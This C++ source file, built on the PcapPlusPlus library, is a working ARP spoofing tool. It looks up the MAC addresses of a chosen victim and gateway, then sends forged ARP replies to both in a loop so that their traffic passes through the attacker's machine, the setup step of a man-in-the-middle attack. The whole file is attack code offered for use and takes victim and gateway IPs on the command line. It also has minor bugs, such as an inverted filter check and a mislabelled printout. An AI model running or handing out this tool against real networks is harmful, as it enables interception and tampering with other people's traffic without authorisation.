//
// Created by harshil on 12/22/24.
//
#include <iostream>
#include <cstdlib>
#include <fstream>
#include <memory>
#include <MacAddress.h>
#include <IpAddress.h>
#include <SystemUtils.h>
#include <PcapLiveDevice.h>
#include <PcapLiveDeviceList.h>
#include <EthLayer.h>
#include <ArpLayer.h>
#include <Logger.h>
#include <csignal>
#include <getopt.h>

#define EXIT_WITH_ERROR(err)                                                              \
    do                                                                                    \
    {                                                                                     \
        printUsage();                                                                     \
        std::cout << std::endl << "ERROR: " << err << std::endl << std::endl;             \
        exit(1);                                                                          \
    } while (0)

static struct option L3FwdOptions[]={
            { "interface", required_argument, nullptr, 'i' },
            { "victim",    required_argument, nullptr, 'c' },
            { "gateway",   required_argument, nullptr, 'g' },
            { "version",   no_argument,       nullptr, 'v' },
            { "help",      no_argument,       nullptr, 'h' },
            { nullptr,     0,                 nullptr, 0   }
};


void printUsage()
{
    std::cout << std::endl
              << "Usage:" << std::endl
              << "------" << std::endl
              << pcpp::AppName::get() << " [-hv] -i interface_ip -c victim_ip -g gateway_ip" << std::endl
              << std::endl
              << "Options:" << std::endl
              << std::endl
              << "    -i interface_ip   : The IPv4 address of interface to use" << std::endl
              << "    -c victim_ip      : The IPv4 address of the victim" << std::endl
              << "    -g gateway_ip     : The IPv4 address of the gateway" << std::endl
              << std::endl;
}

std::atomic<bool> stopLoop = false;

void handleSignal(int signal)
{
    if (signal == SIGINT)
        stopLoop = true;
}

pcpp::MacAddress getMacAddress(const pcpp::IPv4Address ipAddr, pcpp::PcapLiveDevice* dev)
{
    pcpp::Packet arpRequest(500);

    pcpp::MacAddress macSrc = dev->getMacAddress();
    pcpp::MacAddress macDst(0xff,0xff,0xff,0xff,0xff,0xff);

    pcpp::EthLayer ethLayer(macSrc,macDst,static_cast<uint16_t>(PCPP_ETHERTYPE_ARP));
    pcpp::ArpLayer arpLayer(pcpp::ARP_REQUEST, dev->getMacAddress(), dev->getMacAddress(),
                                dev->getIPv4Address(), ipAddr);

    arpRequest.addLayer(&ethLayer);
    arpRequest.addLayer(&arpLayer);
    arpRequest.computeCalculateFields();

    pcpp::ArpFilter arpFilter(pcpp::ARP_REPLY);

    if (dev->setFilter(arpFilter))
    {
        std::cerr << "Unable to set up the ARP filter on the device" << std::endl;
        return pcpp::MacAddress::Zero;
    }

    dev->sendPacket((&arpRequest));
    pcpp::RawPacketVector capturedPackets;
    dev->startCapture(capturedPackets);
    pcpp:pcpp::multiPlatformSleep((2));
    dev->stopCapture();

    if (capturedPackets.size()<1)
    {
        std::cerr << "No ARP reply waws captured"<<std::endl<<
            "Couldn't receive the MAC address for IP "<< ipAddr<<std::endl;
        return pcpp::MacAddress::Zero;
    }
    pcpp::Packet arpReply(capturedPackets.front());
    if (arpReply.isPacketOfType(pcpp::ARP))
    {
        std::cout<<"Success!! MAC Address found!"<<std::endl;
        return arpReply.getLayerOfType<pcpp::ArpLayer>()->getSenderMacAddress();
    }
    std::cerr << "No ARP Reply was captured. Unable to retrieve the MAC address for IP "<< ipAddr<<std::endl;
    return pcpp::MacAddress::Zero;
}

void ARPie(pcpp::PcapLiveDevice* dev,const pcpp::IPv4Address& gatewayAddr,
            const  pcpp::IPv4Address& victimAddr)
{
    pcpp::MacAddress gatewayMac;

    try
    {
        gatewayMac = getMacAddress(gatewayAddr, dev);
    }
    catch (std::exception& e)
    {
        EXIT_WITH_ERROR("Failed to find gateway MAC address: "<<e.what());
    }

    pcpp::MacAddress victimMac;
    try
    {
        victimMac = getMacAddress(victimAddr, dev);
    }
    catch (std::exception& e)
    {
        EXIT_WITH_ERROR("Failed to find victim MAC address: "<<e.what());
    }

    std::cout << std::endl << "Got the victim's MAC address: "
              << gatewayMac <<" !"<< std::endl;


    const pcpp::MacAddress deviceMacAddress = dev->getMacAddress();

    // Create ARP reply to the gateway: Victim's IP -> Attacker's MAC
    pcpp::Packet gwArpReply(500);
    pcpp::EthLayer gatewayEthLayer(deviceMacAddress, gatewayMac, (uint16_t)PCPP_ETHERTYPE_ARP);
    pcpp::ArpLayer gatewayArpLayer(pcpp::ARP_REPLY, deviceMacAddress, gatewayMac, victimAddr, gatewayAddr);
    gwArpReply.addLayer(&gatewayEthLayer);
    gwArpReply.addLayer(&gatewayArpLayer);
    gwArpReply.computeCalculateFields();


    // Create ARP reply to the victim: Gateway's IP -> Attacker's MAC
    pcpp::Packet victimArpReply(500);
    pcpp::EthLayer victimEthLayer(deviceMacAddress, victimMac, (uint16_t)PCPP_ETHERTYPE_ARP);
    pcpp::ArpLayer victimArpLayer(pcpp::ARP_REPLY, deviceMacAddress, victimMac, gatewayAddr, victimAddr);
    victimArpReply.addLayer(&victimEthLayer);
    victimArpReply.addLayer(&victimArpLayer);
    victimArpReply.computeCalculateFields();


    std::cout<<"Sending ARP replies to victim and to gateway every 3 seconds "<<std::endl;
    std::signal(SIGINT, handleSignal);
    std::cout<<"Press \"CTRL+C\" to exit the loop"<<std::endl;
    while (!stopLoop)
    {
        dev->sendPacket(&gwArpReply);
        std::cout << "Sent ARP reply: " << gatewayAddr << " [gateway] is at MAC address " << deviceMacAddress << " [me]"
                  << std::endl;
        dev->sendPacket(&victimArpReply);
        std::cout << "Sent ARP reply: " << victimAddr << " [victim] is at MAC address " << deviceMacAddress << " [me]"
                  << std::endl;
        pcpp::multiPlatformSleep(3);
    }
}

int main(int argc, char* argv[])
{
    pcpp::AppName::init(argc, argv);
    std::string iface, victim, gateway;
    int optionIndex = 0;
    int opt = 0;
    while ((opt = getopt_long(argc, argv, "i:c:g:hv", L3FwdOptions, &optionIndex)) != -1)
    {
        switch (opt)
        {
        case 0:
            break;
        case 'i':
            iface = optarg;
            break;
        case 'c':
            victim = optarg;
            break;
        case 'g':
            gateway = optarg;
            break;
        case 'h':
            printUsage();
            exit(0);

        default:
            printUsage();
            exit(-1);
        }
    }
    if (iface.empty() || victim.empty() || gateway.empty())
    {
        EXIT_WITH_ERROR("Please specify both interface IP, victim IP and gateway IP");
    }

    pcpp::IPv4Address ifaceAddr;
    pcpp::IPv4Address victimAddr;
    pcpp::IPv4Address gatewayAddr;

    try
    {
        ifaceAddr = pcpp::IPv4Address(iface);
    }
    catch (const std::exception&)
    {
        EXIT_WITH_ERROR("Interface address is not valid");
    }
    try
    {
        victimAddr = pcpp::IPv4Address(victim);
    }
    catch (const std::exception&)
    {
        EXIT_WITH_ERROR("Victim address is not valid");
    }
    try
    {
        gatewayAddr = pcpp::IPv4Address(gateway);
    }
    catch (const std::exception&)
    {
        EXIT_WITH_ERROR("Gateway address is not valid");
    }

    pcpp::PcapLiveDevice* pIfaceDevice = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByIp(ifaceAddr);

    // Verifying interface is valid
    if (pIfaceDevice == nullptr)
    {
        EXIT_WITH_ERROR("Cannot find interface");
    }

    // Opening interface device
    if (!pIfaceDevice->open())
    {
        EXIT_WITH_ERROR("Cannot open interface");
    }

    ARPie(pIfaceDevice, gatewayAddr, victimAddr);
}
